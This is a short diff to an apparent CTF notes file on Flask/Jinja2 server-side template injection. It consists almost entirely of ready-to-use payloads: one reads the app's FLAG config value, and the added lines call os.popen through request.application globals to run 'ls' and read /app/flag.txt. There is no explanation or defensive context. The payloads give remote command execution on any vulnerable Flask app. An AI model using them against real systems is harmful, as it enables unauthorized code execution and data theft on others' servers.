@@ -7,3 +7,14 @@ flask SSTI by Jinja2 (Server Side Template Injection)
 or
 
 ={{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+
+
+--------------------------------------------------------------------
+
+v2
+
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}
